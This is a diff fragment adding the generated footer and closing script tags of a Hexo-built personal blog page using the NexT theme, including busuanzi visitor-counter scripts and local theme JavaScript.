+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">素念</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v5.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
